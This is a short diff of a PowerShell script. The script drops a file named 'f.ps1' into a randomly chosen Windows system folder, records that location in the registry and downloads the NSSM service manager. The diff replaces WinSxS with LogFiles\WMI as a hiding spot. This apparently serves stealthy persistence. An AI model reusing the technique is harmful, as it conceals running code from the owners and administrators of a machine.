@@ -7,7 +7,7 @@ $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
     "$env:windir\System32\drivers\etc",
-    "$env:windir\WinSxS"
+    "$env:windir\System32\LogFiles\WMI"
 )
 
 $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
@@ -23,7 +23,7 @@ $downloadPath = "$env:temp\nssm.zip"
 if(($fwdPath -eq $null) -or ($fwdPath -eq "")){
     $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $fwdPath = "$fwdPath\f.ps1"
-    Set-ItemProperty -Path $basePath -Name $propertyName -Value $fwdPath -Force | Out-Null
+    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
 }
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
